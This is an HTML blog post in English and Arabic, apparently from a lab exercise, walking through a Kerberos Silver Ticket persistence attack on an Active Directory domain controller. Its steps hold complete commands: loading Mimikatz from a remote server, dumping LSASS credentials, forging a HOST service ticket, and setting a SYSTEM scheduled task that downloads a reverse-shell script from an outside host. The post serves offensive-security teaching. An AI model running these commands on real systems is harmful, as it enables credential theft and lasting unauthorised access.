@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Persistence - Silver Ticket | Jehad Alqurashi</title>
+<link rel="stylesheet" href="../assets/css/style.css">
+</head>
+<body>
+<div class="nav-wrapper" id="nav-wrapper">
+<nav class="nav">
+<div class="logo">
+<a href="../index.html"><span class="logo-icon">JA</span>Jehad Alqurashi</a>
+</div>
+<ul class="menu">
+<li><a href="../index.html">Home</a></li>
+<li><a href="../tags.html">Tags</a></li>
+</ul>
+</nav>
+</div>
+<div class="reading-progress"><div class="reading-progress-bar" id="reading-bar"></div></div>
+<main class="main">
+<div class="breadcrumb">
+<a href="../index.html">Home</a><span class="sep">/</span><a href="../tags.html">active-directory</a><span class="sep">/</span><span>Persistence - Silver Ticket</span>
+</div>
+<article class="post-single">
+<header class="post-header">
+<div class="post-meta">
+<span class="post-category">active-directory</span>
+<span class="post-date">2023-10-05</span>
+</div>
+<h1 class="post-title">Persistence - Silver Ticket</h1>
+</header>
+<div class="lang-tabs">
+<button class="lang-tab active" onclick="switchLang('en',this)">English</button>
+<button class="lang-tab" onclick="switchLang('ar',this)">Arabic</button>
+</div>
+<div id="content-en" class="post-content">
+<h2>Introduction</h2>
+<p>In this article, we will explain the fourth technique for persistence on the Domain Controller: the Silver Ticket attack.</p>
+<h2>What is a Silver Ticket?</h2>
+<p>The idea behind this technique is that it allows us to take control of a specific service running on a specific machine, whether it is the Domain Controller or any other machine in the domain.</p>
+<h2>Common Target Services</h2>
+<p>What are the services that typically exist on all machines that we can target?</p>
+<ol>
+<li><strong>CIFS</strong> -- Common Internet File System</li>
+<li><strong>HOST</strong> -- Host service for task scheduling</li>
+</ol>
+<p><strong>Note:</strong> There are many other services that can be targeted, but these two are the most relevant for our purposes.</p>
+<h3>What is the HOST Service and How Does It Help with Persistence?</h3>
+<p>The HOST service enables us to create scheduled tasks on the machine where we are exploiting the service. For example, we can create a scheduled task that executes a command to return a reverse shell. This way, whenever we want to re-access the machine at a later time, we simply trigger the scheduled task to get a reverse shell back.</p>
+
+<figure class="article-img"><img src="../assets/images/silver-ticket/2.png" alt="Step 1" loading="lazy"></figure>
+<h3>What is the CIFS Service and How Does It Help with Persistence?</h3>
+<p>The CIFS service enables us to browse and access the file system of the machine where we are exploiting the service. This allows us to read, write, and modify files on the target.</p>
+<h2>Requirements for the Silver Ticket Attack</h2>
+<p>Before executing this technique, we need the following:</p>
+<ol>
+<li><strong>NTLM hash of the target machine's computer account</strong> -- extracted using Mimikatz</li>
+<li><strong>SID of the Domain</strong></li>
+<li><strong>Hostname of the target computer</strong></li>
+<li><strong>User to impersonate</strong> (e.g., Administrator)</li>
+</ol>
+<h2>Step-by-Step Walkthrough</h2>
+<p>We will execute this technique against the Domain Controller. To apply the technique, we must first have a PowerShell session running as a user who is a member of the Domain Admins group.</p>
+<h3>Step 1: Access the Domain Controller</h3>
+<p>First, we enter a remote PowerShell session on the Domain Controller:</p>
+<pre><code class="language-powershell">Enter-PSSession -ComputerName dcorp-dc
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/silver-ticket/3.png" alt="Step 2" loading="lazy"></figure>
+<h3>Step 2: Set Up an HTTP Server for Mimikatz Delivery</h3>
+<p>Next, we start an HTTP server on the same path where the Mimikatz script is located, so we can load it remotely into the Domain Controller's memory.</p>
+<h3>Step 3: Load Mimikatz into Memory</h3>
+<p>We load the Invoke-Mimikatz PowerShell script into the Domain Controller's memory using the following command:</p>
+<pre><code class="language-powershell">iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/silver-ticket/4.png" alt="Step 3" loading="lazy"></figure>
+<h3>Step 4: Extract All Credentials from the LSASS Process</h3>
+<p>Now we run Mimikatz to dump all passwords and hashes stored in the LSASS process:</p>
+<pre><code class="language-powershell">Invoke-Mimikatz -Command '&quot;lsadump::lsa /patch&quot;'
+</code></pre>
+<p>This extracts the NTLM hash of the Domain Controller's computer account, which is the first requirement for creating our Silver Ticket.</p>
+<h3>Step 5: Obtain the Domain SID</h3>
+<p>Now we extract the second requirement -- the Domain SID -- using the PowerView tool:</p>
+<pre><code class="language-powershell">Get-DomainSID
+</code></pre>
+
+<figure class="article-img"><img src="../assets/images/silver-ticket/5.png" alt="Step 4" loading="lazy"></figure>
+<h3>Step 6: Create the Silver Ticket Targeting the HOST Service</h3>
+<p>Now we open a new PowerShell session and use Mimikatz to create a Silver Ticket that targets the HOST service on the Domain Controller. The <code>kerberos::golden</code> command is used (Silver Tickets use the same Mimikatz command as Golden Tickets, but with the <code>/service</code> parameter to scope it to a specific service):</p>
+<pre><code class="language-powershell">kerberos::golden /user:Administrator /rc4:e882c92024e683640c00ae83d43b5c88 /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /service:HOST /ptt
+</code></pre>
+<p>The <code>/ptt</code> flag injects the forged ticket directly into our current session.</p>
+<h3>Step 7: Verify Access to Scheduled Tasks</h3>
+<p>Now we verify that our Silver Ticket works by checking whether we can view the scheduled tasks on the Domain Controller:</p>
+<pre><code class="language-powershell">schtasks /S dcorp-dc.dollarcorp.moneycorp.local
+</code></pre>
+<p>If we can list the scheduled tasks, it confirms that our HOST service Silver Ticket is working and we have the ability to create and manage scheduled tasks on the Domain Controller.</p>
+
+<figure class="article-img"><img src="../assets/images/silver-ticket/6.png" alt="Step 5" loading="lazy"></figure>
+<h3>Step 8: Create a Scheduled Task for a Reverse Shell</h3>
+<p>Now we can create a scheduled task that will give us a reverse shell on the Domain Controller at any time we choose. We will use the <code>Invoke-PowerShellTcp.ps1</code> script for this purpose.</p>
+<p>First, we start an HTTP server on the same path where <code>Invoke-PowerShellTcp.ps1</code> is located so the Domain Controller can download it.</p>
+<p>Then we create the scheduled task using the following command:</p>
+<pre><code class="language-powershell">schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU &quot;NT Authority\SYSTEM&quot; /TN &quot;jehad1&quot; /TR &quot;powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.7/Invoke-PowerShellTcp.ps1''')'&quot;
+</code></pre>
+<p>This creates a weekly scheduled task named <code>jehad1</code> that runs as <code>NT Authority\SYSTEM</code> on the Domain Controller. When triggered, it downloads and executes the reverse shell script from our HTTP server.</p>
+<h3>Step 9: Start a Listener and Execute the Task</h3>
+<p>Before running the scheduled task, we start a listener on the port where the reverse shell will connect back, using PowerCat or Netcat.</p>
+<p>Then we trigger the scheduled task:</p>
+<pre><code class="language-powershell">schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN &quot;jehad1&quot;
+</code></pre>
+<p>The scheduled task executes on the Domain Controller, downloads our reverse shell script, and connects back to our listener -- giving us a fully interactive shell with <code>NT AUTHORITY\SYSTEM</code> privileges on the Domain Controller.</p>
+<p>This scheduled task will persist, allowing us to trigger it at any point in the future to regain access to the Domain Controller without needing to re-exploit any vulnerabilities.</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/7.png" alt="Step 6" loading="lazy"></figure>
+
+</div>
+<div id="content-ar" class="post-content rtl-content" style="display:none;direction:rtl;text-align:right;">
+<p>السلام عليكم ورحمة الله وبركاته</p>
+<p>الحمد لله على جميع نِعمه علينا ما علمنا منها وما لم نعلم حمداً والصلاة والسلام على نبينا محمد اشرف الخلق والمرسلين, اما بعد:</p>
+<p>مقدمة:</p>
+<p>في المقالة هذي راح اشرح التكنيك الرابع لتثبيت الاختراق على ال Domain Controller</p>
+<p>ايش هو تكنيك Silver ticket؟</p>
+<p>فكرة هذا التكنيك انه يمكننا من التحكم في خدمة معينه شغالة على جهاز معين سواء كان Domain Controller او غيره</p>
+<p>ايش هي الخدمات اللي دائما تكون في جميع الاجهزة مثلا خدمة ؟</p>
+<p>1- CIFS</p>
+<p>2-HOST</p>
+<p>تنويه : يوجد خدمات اخرى كثير بس هذي اللي تهمنا حاليا</p>
+<p>ايش هي خدمة ال HOST وفي ايش راح تفيدنا في تثبيت الاختراق؟</p>
+<p>هذي الخدمة تمكنا من انشاء جدولة لي اوامر معينه على نفس الجهاز اللي مستغلين عليه الخدمة</p>
+<p>مثلا انه نسوي جدولة ل امر يرجع لنا Reverse Shell او اتصال عكسي بحيث في اي وقت حبيت ادخل الى هذا الجهاز مره اخرى اسوي جدولة الى امر يرجعلي Reverse Shell</p>
+<p>ايش هي خدمة ال CIFS وفي ايش راح تفيدنا في تثبيت الاختراق؟</p>
+<p>هذي الخدمة تمكننا من تصفح ملفات الجهاز اللي مستغلين عليه الخدمة</p>
+<p>ايش متطلبات هذا التكنيك؟</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/2.png" alt="Step 1" loading="lazy"></figure>
+
+<p>1- NTLM هاش الخاص بالجهاز اللي راح نستخرجة عن طريق اداة Mimikatz</p>
+<p>2- SID of Domain</p>
+<p>3- hostname of computer</p>
+<p>4- User to impersonate</p>
+<p>الشرح:</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/3.png" alt="Step 2" loading="lazy"></figure>
+
+<p>راح ننفذ التكنيك على جهاز Domain Controller</p>
+<p>طبعا عشان نطبق التكنيك لازم نشغل جلسة PowerShell بمستخدم ضمن قروب Domain Admins</p>
+<p>اول شي راح ندخل لجهاز Domain Controller عن طريق هذا الامر:</p>
+<p>Enter-PSSession -ComputerName dcorp-dc</p>
+<p>بعد كذا راح نسوي تشغيل الى http server على نفس المسار اللي موجودة فيه Mimikatz</p>
+<p>الان راح اسوي Load ل اداة Mimikatz عن طريق هذا الامر:</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/4.png" alt="Step 3" loading="lazy"></figure>
+
+<p>iex (iwr http://172.16.100.7/Invoke-Mimikatz.ps1 -UseBasicParsing)</p>
+<p>بعد ننفذ هذا الامر عشان يسحب لنا جميع الباسوردات اللي موجودة في ال Lsass proccess</p>
+<p>Invoke-Mimikatz -Command '"lsadump::lsa /patch"'</p>
+<p>الان طلعت الهاش الخاص بالجهاز</p>
+<p>الان راح نستخرج المتطلب الثاني اللي Domain SID عن طريق اداة PowerView عن طريق هذا الامر:</p>
+<p>Get-DomainSID</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/5.png" alt="Step 4" loading="lazy"></figure>
+
+<p>الان راح اشغل جلسة Powershell و ننفذ امر بحيث يستغل لنا خدمة ال HOST على جهاز الDomain Controller عن طريق اداة Mimikatz</p>
+<p>kerberos::golden /user:Administrator /rc4:e882c92024e683640c00ae83d43b5c88 /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /domain:dollarcorp.moneycorp.local /service:HOST /ptt</p>
+<p>الان راح ننفذ هذا الامر بحيث نشوف هل صار عندنا صلاحية نطلع على ال Scheduling Tasks او لا</p>
+<p>schtasks /S dcorp-dc.dollarcorp.moneycorp.local</p>
+<p>الان يمكننا ننشأ scheduling task بحيث نجيب Reverse Shell على جهاز الـ Domain Controller في اي وقت اخر</p>
+<p>لكن خلونا نجرب نسوي Reverse shell عن طريق scheduling task</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/6.png" alt="Step 5" loading="lazy"></figure>
+
+<p>راح استخدم سكربت Invoke-PowerShellTcp.ps1 وراح ننشأ scheduling task راح يسوي Load في الميموري الخاص بجهاز Domain Controller</p>
+<p>اول شي راح اشغل الى http server على نفس المسار اللي موجودة فيه Invoke-PowerShellTcp.ps1</p>
+<p>هذا الامر اللي راح ننشأ عن طريقه schedule task :</p>
+<p>schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "jehad1" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.7/Invoke-PowerShellTcp.ps1''')'"</p>
+<p>قبل لا نسوي تشغيل لي الـ schedule task راح اتنصت على البورت اللي راح يجيني عليه الـ Reverse shell عن طريق اداة PowerCat</p>
+<figure class="article-img"><img src="../assets/images/silver-ticket/7.png" alt="Step 6" loading="lazy"></figure>
+
+<p>بعد كذا راح اسوي تشغيل لي الـ schedule task عن طريق هذا الامر:</p>
+<p>schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "jehad1"</p>
+<p>الان خلونا نشوف هل وصل لنا Reverse Shell او لا</p>
+<p>وبكذا وصلنا الى نهاية المقالة</p>
+<p>شاكر لكم.</p>
+</div>
+<div class="post-nav">
+<a href="../index.html">&larr; Back to all articles</a>
+</div>
+</article>
+</main>
+<footer class="footer">
+<span>&copy; 2024 Jehad Alqurashi</span>
+<br><a href="#" class="top-link">&uarr; Back to top</a>
+</footer>
+<div class="night-bg" id="nightsky"></div>
+<div class="lightning"></div>
+<div class="rain-splash"></div>
+<script>
+(function(){
+  var c=document.getElementById('nightsky');
+  for(var i=0;i<5;i++){
+    var cl=document.createElement('div');
+    cl.className='cloud';
+    cl.style.top=(i*8+2)+'%';
+    cl.style.left='-20%';
+    cl.style.width=(200+i*80)+'px';
+    cl.style.height=(60+i*20)+'px';
+    cl.style.background='rgba(80,100,140,'+(0.03+i*0.01)+')';
+    cl.style.animationDuration=(60+i*20)+'s';
+    cl.style.animationDelay=(i*12)+'s';
+    c.appendChild(cl);
+  }
+  for(var i=0;i<120;i++){
+    var d=document.createElement('div');
+    d.className='rain-drop';
+    d.style.left=Math.random()*100+'%';
+    var far=Math.random();
+    if(far<0.5){
+      d.style.height=(Math.random()*18+14)+'px';
+      d.style.width='1.5px';
+      d.style.animationDuration=(Math.random()*0.4+0.4)+'s';
+      d.style.opacity=Math.random()*0.15+0.1;
+    } else {
+      d.style.height=(Math.random()*10+6)+'px';
+      d.style.width='0.5px';
+      d.style.animationDuration=(Math.random()*0.6+0.7)+'s';
+      d.style.opacity=Math.random()*0.08+0.03;
+    }
+    d.style.animationDelay=(Math.random()*2)+'s';
+    c.appendChild(d);
+  }
+  for(var i=0;i<20;i++){
+    var p=document.createElement('div');
+    p.className='particle';
+    p.style.left=Math.random()*100+'%';
+    p.style.width=p.style.height=(Math.random()*2+1)+'px';
+    p.style.background=Math.random()>0.5?'rgba(0,212,255,0.3)':'rgba(139,92,246,0.2)';
+    p.style.animationDuration=(Math.random()*15+10)+'s';
+    p.style.animationDelay=(Math.random()*10)+'s';
+    c.appendChild(p);
+  }
+})();
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var nw=document.getElementById('nav-wrapper');
+  if(nw) nw.classList.toggle('scrolled',window.scrollY>20);
+});
+</script>
+<script>
+function switchLang(lang, btn) {
+  document.querySelectorAll('.lang-tab').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  document.getElementById('content-en').style.display = lang === 'en' ? '' : 'none';
+  document.getElementById('content-ar').style.display = lang === 'ar' ? '' : 'none';
+}
+</script>
+<script>
+window.addEventListener('scroll',function(){
+  var bar=document.getElementById('reading-bar');
+  if(!bar)return;
+  var h=document.documentElement.scrollHeight-window.innerHeight;
+  bar.style.width=h>0?Math.min(100,window.scrollY/h*100)+'%':'0%';
+});
+document.addEventListener('click',function(e){
+  if(e.target.closest('.article-img img')){
+    var src=e.target.src;
+    var ov=document.createElement('div');
+    ov.className='lightbox-overlay';
+    ov.innerHTML='<img src="'+src+'" alt="Zoomed">';
+    document.body.appendChild(ov);
+    setTimeout(function(){ov.classList.add('active');},10);
+    ov.onclick=function(){ov.classList.remove('active');setTimeout(function(){ov.remove();},300);};
+  }
+});
+</script>
+</body>
+</html>
